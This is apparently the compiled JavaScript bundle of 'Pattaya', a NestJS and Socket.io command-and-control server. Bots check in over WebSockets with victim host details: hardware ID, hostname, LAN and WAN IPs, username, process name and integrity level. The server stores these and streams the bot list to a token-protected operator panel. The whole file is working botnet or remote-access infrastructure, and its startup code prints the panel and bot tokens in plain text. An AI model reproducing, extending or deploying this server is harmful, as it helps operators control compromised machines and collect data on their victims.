(()=>{"use strict";var e={579:function(e,t,r){var o=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n};Object.defineProperty(t,"__esModule",{value:!0}),t.PrismaModule=void 0;const s=r(481),a=r(510);let n=class{};n=o([(0,s.Global)(),(0,s.Module)({providers:[a.PrismaService],exports:[a.PrismaService]})],n),t.PrismaModule=n},510:function(e,t,r){var o=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n};Object.defineProperty(t,"__esModule",{value:!0}),t.PrismaService=void 0;const s=r(481),a=r(524);let n=class extends a.PrismaClient{async onModuleInit(){await this.$connect()}async enableShutdownHooks(e){this.$on("beforeExit",(async()=>{await e.close()}))}};n=o([(0,s.Injectable)()],n),t.PrismaService=n},349:function(e,t,r){var o=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n},s=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.AppController=void 0;const a=r(481),n=r(653);let c=class{constructor(e){this.appService=e}getHello(){return this.appService.getHello()}};o([(0,a.Get)(),s("design:type",Function),s("design:paramtypes",[]),s("design:returntype",String)],c.prototype,"getHello",null),c=o([(0,a.Controller)(),s("design:paramtypes",[n.AppService])],c),t.AppController=c},288:function(e,t,r){var o=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n};Object.defineProperty(t,"__esModule",{value:!0}),t.AppModule=void 0;const s=r(481),a=r(349),n=r(653),c=r(698),i=r(147),l=r(473),p=r(17),d=r(793);let u=class{};u=o([(0,s.Global)(),(0,s.Module)({imports:[c.PattayaMessagesModule,d.ConfigModule.forRoot({load:[()=>l.load((0,i.readFileSync)((0,p.join)(process.cwd(),"assets","config","app.config.yaml"),"utf8"))]})],controllers:[a.AppController],providers:[n.AppService]})],u),t.AppModule=u},653:function(e,t,r){var o=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n};Object.defineProperty(t,"__esModule",{value:!0}),t.AppService=void 0;const s=r(481);let a=class{getHello(){return"Welcome to Pattaya!!"}};a=o([(0,s.Injectable)()],a),t.AppService=a},348:function(e,t,r){var o=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n},s=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.BotAuthGuard=void 0;const a=r(481),n=r(793);let c=class{constructor(e){this.configService=e}canActivate(e){const t=e.switchToHttp().getRequest();return this.validateRequest(t)}validateRequest(e){return e.handshake.headers.authorization.replace("$$$$$$ ","")===this.configService.get("app.bot-token")}};c=o([(0,a.Injectable)(),s("design:paramtypes",[n.ConfigService])],c),t.BotAuthGuard=c},925:function(e,t,r){var o=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n},s=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.PanelAuthGuard=void 0;const a=r(481),n=r(793);let c=class{constructor(e){this.configService=e}canActivate(e){const t=e.switchToHttp().getRequest();return this.validateRequest(t)}validateRequest(e){return e.handshake.headers.authorization.replace("###### ","")===this.configService.get("app.server-token")}};c=o([(0,a.Injectable)(),s("design:paramtypes",[n.ConfigService])],c),t.PanelAuthGuard=c},943:function(e,t,r){var o,s=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n},a=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(r,o){t(r,o,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PattayaMessagesGateway=void 0;const c=r(279),i=r(435),l=r(481),p=r(952),d=r(925),u=r(793),f=r(348);let h=o=class{constructor(e,t,r,s){this.pattayaMessagesService=e,this.panelGuard=t,this.botGuard=r,this.configService=s,this.logger=new l.Logger(o.name)}afterInit(e){this.logger.log("Socket.io server initialized"),setInterval((async()=>{const e={success:!0,message:"Greet from server!!!"};this.server.emit("panel_received_server_heartbeat",e),this.logger.log(`Response server heartbeat: ${e.message}`)}),this.configService.get("app.server-heartbeat-delay"))}handleConnection(e,...t){this.logger.log(`Client connected: ${e.id}`);let r="";try{switch(r=e.handshake.headers.authorization.substring(0,7),this.logger.log(`Request token: ${e.handshake.headers.authorization}`),r){case"###### ":if(this.panelGuard.validateRequest(e)){const e={success:!1,message:"New panel has join!"};this.server.emit("panel_received_server_heartbeat",e)}else{const t={success:!1,message:"Unknown panel tried to connect to server"};this.server.emit("panel_received_server_heartbeat",t),e.disconnect()}break;case"$$$$$$ ":if(this.botGuard.validateRequest(e)){const e={success:!1,message:"New bot has join!"};this.server.emit("panel_received_server_heartbeat",e)}else{const t={success:!1,message:"Unknown bot tried to connect to server"};this.server.emit("panel_received_server_heartbeat",t),e.disconnect()}break;default:{const t={success:!1,message:"Unknown peer tried to connect to server"};this.server.emit("panel_received_server_heartbeat",t),e.disconnect();break}}}catch(t){const r={success:!1,message:"Seem Junk request to server!"};this.server.emit("panel_received_server_heartbeat",r),e.disconnect()}}async handleDisconnect(e){this.logger.log(`Client disconnected: ${e.id}`),await this.pattayaMessagesService.botOffline(e.id),this.requestBotData({},e)}async botCheckin(e,t){e.socketId=t.id,this.logger.log(`bot checkin request: ${JSON.stringify(e)}`);const r=await this.pattayaMessagesService.botCheckin(e);return this.requestBotData({},t),r?{success:!0,message:"Bot checked-in"}:{success:!1,message:"Cannot checkin"}}async requestBotData(e,t){this.logger.log("panel_request_bot_data called");const r={success:!0,message:"Bot checked-in",data:await this.pattayaMessagesService.getAllBots()};this.logger.log(`response to panel_request_bot_data called: ${JSON.stringify(r)}`),this.server.emit("panel_received_bot_data",r)}};s([(0,c.WebSocketServer)(),a("design:type",p.Server)],h.prototype,"server",void 0),s([(0,c.SubscribeMessage)("bot_checkin"),n(0,(0,c.MessageBody)()),n(1,(0,c.ConnectedSocket)()),a("design:type",Function),a("design:paramtypes",[Object,p.Socket]),a("design:returntype",Promise)],h.prototype,"botCheckin",null),s([(0,l.UseGuards)(d.PanelAuthGuard),(0,c.SubscribeMessage)("panel_request_bot_data"),n(0,(0,c.MessageBody)()),n(1,(0,c.ConnectedSocket)()),a("design:type",Function),a("design:paramtypes",[Object,p.Socket]),a("design:returntype",Promise)],h.prototype,"requestBotData",null),h=o=s([(0,c.WebSocketGateway)({namespace:"/",cors:{origin:"*"}}),a("design:paramtypes",[i.PattayaMessagesService,d.PanelAuthGuard,f.BotAuthGuard,u.ConfigService])],h),t.PattayaMessagesGateway=h},698:function(e,t,r){var o=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n};Object.defineProperty(t,"__esModule",{value:!0}),t.PattayaMessagesModule=void 0;const s=r(481),a=r(435),n=r(943),c=r(579),i=r(925),l=r(793),p=r(348);let d=class{};d=o([(0,s.Module)({imports:[c.PrismaModule],providers:[n.PattayaMessagesGateway,a.PattayaMessagesService,p.BotAuthGuard,i.PanelAuthGuard,l.ConfigService]})],d),t.PattayaMessagesModule=d},435:function(e,t,r){var o,s=this&&this.__decorate||function(e,t,r,o){var s,a=arguments.length,n=a<3?t:null===o?o=Object.getOwnPropertyDescriptor(t,r):o;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)n=Reflect.decorate(e,t,r,o);else for(var c=e.length-1;c>=0;c--)(s=e[c])&&(n=(a<3?s(n):a>3?s(t,r,n):s(t,r))||n);return a>3&&n&&Object.defineProperty(t,r,n),n},a=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.PattayaMessagesService=void 0;const n=r(481),c=r(510);let i=o=class{constructor(e){this.prisma=e,this.logger=new n.Logger(o.name)}async botCheckin(e){try{return await this.prisma.bot.findUnique({where:{hwid:e.hwid}})?(this.logger.log("found existing bot, UPDATE"),await this.prisma.bot.update({where:{hwid:e.hwid},data:{country:e.country,hostname:e.hostname,hwid:e.hwid,lanIp:e.lanIp,os:e.os,socketId:e.socketId,username:e.username,wanIp:e.wanIp,architecture:e.architecture,processId:e.processId,integrity:e.integrity,processName:e.processName}})):(this.logger.log("inseret new bot, CREATED"),await this.prisma.bot.create({data:{country:e.country,hostname:e.hostname,hwid:e.hwid,lanIp:e.lanIp,os:e.os,socketId:e.socketId,username:e.username,wanIp:e.wanIp,architecture:e.architecture,processId:e.processId,integrity:e.integrity,processName:e.processName}})),!0}catch(e){return this.logger.error("Something wrong",e),!1}}async botOffline(e){try{const t=await this.prisma.bot.findFirst({where:{socketId:e}});if(null==t)return;t&&await this.prisma.bot.deleteMany({where:{socketId:e}}),this.logger.log(`set bot hwid: ${t.hwid}, OFFLINE`)}catch(e){this.logger.error("Something wrong",e)}}async getAllBots(){try{return await this.prisma.bot.findMany({})}catch(e){this.logger.error("Something wrong",e)}}async getOnlineBot(){try{return(await this.prisma.bot.findMany({})).length}catch(e){return this.logger.error("Something wrong",e),0}}};i=o=s([(0,n.Injectable)(),a("design:paramtypes",[c.PrismaService])],i),t.PattayaMessagesService=i},481:e=>{e.exports=require("@nestjs/common")},793:e=>{e.exports=require("@nestjs/config")},143:e=>{e.exports=require("@nestjs/core")},279:e=>{e.exports=require("@nestjs/websockets")},524:e=>{e.exports=require("@prisma/client")},357:e=>{e.exports=require("colors")},473:e=>{e.exports=require("js-yaml")},952:e=>{e.exports=require("socket.io")},147:e=>{e.exports=require("fs")},17:e=>{e.exports=require("path")}},t={};function r(o){var s=t[o];if(void 0!==s)return s.exports;var a=t[o]={exports:{}};return e[o].call(a.exports,a,a.exports,r),a.exports}(()=>{const e=r(143),t=r(288),o=r(357),s=r(17),a=r(147),n=r(473).load((0,a.readFileSync)((0,s.join)(process.cwd(),"assets","config","app.config.yaml"),"utf8"));!async function(){const r=(0,a.readFileSync)((0,s.join)(process.cwd(),"assets","banner","pattaya.txt"),"utf8");console.log(o.rainbow(`${r}`)),console.log(o.inverse(`name: ${n.app.name}`)),console.log(o.inverse(`description: ${n.app.description}`)),console.log(o.inverse(`version: ${n.app.version}`)),console.log(o.inverse(`port: ${n.app.port}`)),console.log(o.inverse(`server-token: ${n.app["server-token"]}`)),console.log(o.inverse(`bot-token: ${n.app["bot-token"]}`)),console.log(o.inverse(`server-heartbeat-delay: ${n.app["server-heartbeat-delay"]}`)),console.log(o.inverse(`endpoint: http://localhost:${n.app.port}/`)),console.log("\n"),console.log(o.red.underline("developer: un4ckn0wl3z (https://github.com/un4ckn0wl3z)")),console.log(o.green.underline("contact: pattaya.dev@unknownclub.net")),console.log(o.blue.underline("visite: https://www.unknownclub.net/")),console.log("\n");const c=await e.NestFactory.create(t.AppModule,{logger:n.app.logger});await c.listen(n.app.port)}()})()})();
//# sourceMappingURL=main.js.map